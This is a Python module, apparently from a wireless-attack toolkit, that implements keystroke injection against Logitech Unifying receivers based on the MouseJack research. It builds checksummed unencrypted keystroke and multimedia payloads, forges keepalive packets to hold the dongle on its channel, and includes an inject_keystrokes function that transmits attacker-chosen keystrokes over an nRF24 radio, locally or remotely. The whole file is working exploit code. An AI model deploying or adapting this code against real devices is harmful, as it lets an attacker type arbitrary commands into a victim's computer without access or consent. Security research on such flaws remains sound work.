"""
This file contains the functionalities specific to the Logitech Unifying protocol,
including payload formats, keepalive payloads and implementation of keystroke injection.
"""

import time
from .hid_scan_codes import * # no problem doing a relative import since this file should not be executed

# constants
KEEPALIVE_TIMEOUT = 0x4B0 # 1200ms
TIMEOUT_BYTES = KEEPALIVE_TIMEOUT.to_bytes(2, byteorder='big') # splitting the timeout into two bytes in big endian (b'\x04\0xB0')
DELAY_BETWEEN_TRANSMISSIONS = 12 / 1000 # 12ms

def with_checksum(payload):
    """
    This function calculates the checksum of a given Unifying payload and appends the result at the end of the payload.
    The algorithm is based on slide 56 of the KeyKeriki project: http://www.remote-exploit.org/content/keykeriki_v2_cansec_v1.1.pdf
    """
    cksum = 0xFF
    for n in range(len(payload)):
        cksum = (cksum - payload[n]) & 0xFF # using bitwise AND with 0xFF in order to make sure the checksum doesn't go negative (and thus exceeds 1 byte)
    cksum = (cksum + 1) & 0xFF # if cksum is 0xFF at this point, then adding 1 will cause it to exceed 1 byte, so doing the same thing
    payload.append(cksum)
    return payload

def unencrypted_keystroke_payload(scan_code, modifier=KEY_MOD_NONE):
    """
    This function returns an unencrypted keystroke payload based on the given scan code and modifier.
    Refer to Table 8 in the MouseJack whitepaper: Logitech Unencrypted Keystroke Payload.
    """
    return with_checksum([0x00, 0xC1, modifier, scan_code, 0x00, 0x00, 0x00, 0x00, 0x00]) # applying the checksum

def multimedia_key_payload(scan_code):
    """
    This function returns a multimedia key payload based on the given scan code.
    Refer to Table 9 in the MouseJack whitepaper: Logitech Multimedia Key Payload.
    """
    return with_checksum([0x00, 0xC3] + list(scan_code.to_bytes(2, byteorder='little')) + [0x00, 0x00, 0x00, 0x00, 0x00]) # for codes more than one byte long, turns out it needs to be little endian

# Keepalive-related payload formats
SET_KEEPALIVE_TIMEOUT_PAYLOAD = with_checksum([0x00, 0x4F, 0x00] + list(TIMEOUT_BYTES) + [0x00, 0x00, 0x00, 0x00]) # refer to Figure 5 in the MouseJack whitepaper: Logitech Unifying Set Keepalive Timeout Payload
KEEPALIVE_PAYLOAD = with_checksum([0x00, 0x40] + list(TIMEOUT_BYTES)) # refer to Figure 6 in the MouseJack whitepaper: Logitech Unifying Keepalive Payload

def build_frame(scan_code, modifier=KEY_MOD_NONE):
    """
    This function receives the scan code and modifier of a keystroke, and returns the proper frame/payload (list of bytes).
    """
    if scan_code in multimedia_keys:
        return multimedia_key_payload(scan_code)
    return unencrypted_keystroke_payload(scan_code, modifier)

def inject_keystrokes(radio, keystrokes):
    """
    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack)
    and a list of keystrokes, meaning a list where each element is a list of the form: [scan_code, modifier].
    The function performs a keystroke injection attack against a vulnerable Logitech Unifying receiver.
    """

    if len(keystrokes) == 0:
        return # no keystrokes to inject...
    
    """
    There is a problem we need to address - the dongle and paired device could move to a different channel while injecting the keystrokes,
    thus breaking the attack. According to the whitepaper, they remain on the same channel as long as there is no packet loss. To indicate this, the device
    sends periodic keepalive packets to its dongle. It has to do so within a known interval/timeout, which is set by the device. If the timeout has passed without
    the dongle receiving a keepalive packet from the device, they move to a different channel. In addition, even if all keepalives are delivered on time, but the device is idle,
    the keepalive interval/timeout is increased every once in a while. But that's less important.
    The whitepaper states that in order to perform a successful attack, "an attacker needs to mimic the keepalive behavior used by Unifying keyboards and mice".
    So we first send the dongle a packet that sets a relatively long keepalive timeout, and then transmit keepalives very frequently. This way we can be confident
    that there won't be a timeout that would cause the dongle to switch channels unexpectedly.
    """
    
    # transmitting payload that sets the keepalive timeout
    radio.transmit_payload(SET_KEEPALIVE_TIMEOUT_PAYLOAD)
    time.sleep(DELAY_BETWEEN_TRANSMISSIONS) # waiting before the next transmission

    # We need to remember whether the last injected key was a multimedia key or a standard one,
    # because we could have a key release packet in the middle, and in order to have an effect it should match the type of the key typed just before it.
    is_last_key_multimedia = False

    for scan_code, modifier in keystrokes:
        # special case - DELAY invoked from DuckyScript parser (modifier is the interval in ms)
        if scan_code == KEY_DELAY:
            # Transmitting delay_interval/10 keepalive packets with a delay of 10ms between each other,
            # to achieve a total delay of delay_interval ms without losing the channel.
            for i in range(modifier // 10):
                radio.transmit_payload(KEEPALIVE_PAYLOAD)
                time.sleep(10 / 1000)
            return

        # special case - if the current keystroke is a key release of a previous multimedia key, then transmit a multimedia key payload
        if scan_code == KEY_RELEASE and is_last_key_multimedia:
            radio.transmit_payload(multimedia_key_payload(scan_code))
            is_last_key_multimedia = True # update the flag
        else:
            radio.transmit_payload(build_frame(scan_code, modifier)) # transmit the proper frame
            is_last_key_multimedia = (scan_code in multimedia_keys) # update the flag
        time.sleep(DELAY_BETWEEN_TRANSMISSIONS) # waiting before the next transmission
        radio.transmit_payload(KEEPALIVE_PAYLOAD) # transmitting keepalive after each keystroke

    # we have to transmit a key release at the end, otherwise it would keep typing the last key forever, so checking for the proper payload type
    if is_last_key_multimedia:
        radio.transmit_payload(multimedia_key_payload(KEY_RELEASE))
    else:
        radio.transmit_payload(unencrypted_keystroke_payload(KEY_RELEASE))
